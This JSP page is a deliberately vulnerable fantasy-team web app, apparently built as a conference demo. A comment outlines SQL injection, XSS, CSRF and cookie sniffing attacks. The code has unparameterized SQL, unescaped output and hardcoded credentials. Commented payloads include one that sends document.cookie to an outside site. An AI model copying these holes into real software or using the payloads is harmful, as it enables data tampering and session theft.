
<%@ page import="java.sql.*"%>

<html>
<head>
<title>Sample Application JSP Page</title>


</head>
<body bgcolor=white>

<%--

1. change points with sql inj
2. get lineup with xss
3. change lineup with csrf
4. sniff cookie at cafe

--%>


<%
  String curTeamName = "";
  int curOwnPoints = 0;
  int curOpponentPoints = 0;
  String oppTeamName = "";
  String db = "techcon";
  String db_user = "mysql"; // assumes database name is the same as username
  ResultSet teamNameRs = null;
  ResultSet pointsRs = null;
  ResultSet oppPointsRs = null;
  ResultSet lineupRs = null;
  ResultSet oppTeamNameRs = null;
  java.sql.Connection con = null;
  String username = request.getUserPrincipal().getName();
  try {
    Class.forName("com.mysql.jdbc.Driver");
    con = DriverManager.getConnection("jdbc:mysql://localhost/"+db+"?useUnicode=true&useJDBCCompliantTimezoneShift=true&useLegacyDatetimeCode=false&serverTimezone=UTC", db_user, "mysql");
    //out.println (db+ " database successfully opened.");
    Statement statement = con.createStatement() ;
             //resultset = statement.executeQuery("select * from lineup") ; 
             String teamName = request.getParameter("teamName");
             String updateStr1 = "update team set teamName = '";
             String updateStr2 = "' where userName = '"+username+"'";
             //teamName = "hack', points='100";
             //teamName = "<img src=\"javascript:alert(''hello everybody'')\"></img>";
             //teamName = "<script src=\"http://localhost:9090/sample/alert.js\"></script>";
             String updateStr = updateStr1 + teamName + updateStr2;

             if(teamName!=null){
	             statement.execute(updateStr);
    		 }
    		 String teamNameQuery = "select teamName from team where userName = '"+username+"'";
             teamNameRs = statement.executeQuery(teamNameQuery) ;
             teamNameRs.next(); 
             curTeamName = teamNameRs.getString(1);

    		 String pointsQuery = "select points from team where teamName = '"+curTeamName+"'";
             pointsRs = statement.executeQuery(pointsQuery) ;
             pointsRs.next(); 
             curOwnPoints = pointsRs.getInt(1);

    		 String oppTeamNameQuery = "select teamName from team where userName != '"+username+"'";
             oppTeamNameRs = statement.executeQuery(oppTeamNameQuery) ;
             oppTeamNameRs.next(); 
             oppTeamName = oppTeamNameRs.getString(1);

    		 String oppPointsQuery = "select points from team where teamName = '"+oppTeamName+"'";
             oppPointsRs = statement.executeQuery(oppPointsQuery) ;
             oppPointsRs.next(); 
             curOpponentPoints = oppPointsRs.getInt(1);

             String playerName = request.getParameter("player");
             String toggleQuery = "";
             if(playerName!=null){
             	toggleQuery = "update lineup set status = if(status='Starting','Bench', 'Starting') where playerName = '"+playerName+"' and userName = '"+username+"'";
             	statement.execute(toggleQuery);	
         	 }

%>

<form method="post">
	<input type="textField" name="teamName"/>
</form>

<p>
<%--
<script>document.location.href='google.com?'+document.cookie</script>
<script>alert('hi: '+document.cookie)</script>
--%>

<!-- <script src="http://localhost:9090/sample/alert.js"></script><script>window.onload=myfn;</script> -->
Welcome <%=username%>!<p>

Team name is <%=curTeamName %><p>

        <TABLE BORDER="1">
            <TR>
                <TH>Team</TH>
                <TH>Points</TH>
                <TH>vs.</TH>
                <TH>Opponent</TH>
                <TH>Points</TH>
            </TR>
            <TR>
                <TD> <%= curTeamName %></td>
                <TD> <%= curOwnPoints %></TD>
                <TD>vs.</TD>
                <TD> <%= oppTeamName %></TD>
                <TD> <%= curOpponentPoints %></TD>
            </TR>
            
        </TABLE>


<table border="1" id="lineupTable">
<%
	 String lineupQuery = "select * from lineup where userName = '"+username+"'";
     lineupRs = statement.executeQuery(lineupQuery) ;
     while(lineupRs.next()){
%>

<tr>
	<td>
		<%=lineupRs.getString(3)%>
	</td>
	<td>
		<%=lineupRs.getString(4)%>
	</td>
	<td>
		<%=lineupRs.getString(5)%>
	</td>
	<td>
		<a href="?player=<%=lineupRs.getString(4)%>">Update Status</a>
	</td>
</tr>

<%
 	 }
%></table>
<%
  }
  catch(SQLException e) {
    out.println("SQLException caught: " +e.getMessage());
  }finally{
  	con.close();
  }

%>

</body>
</html>
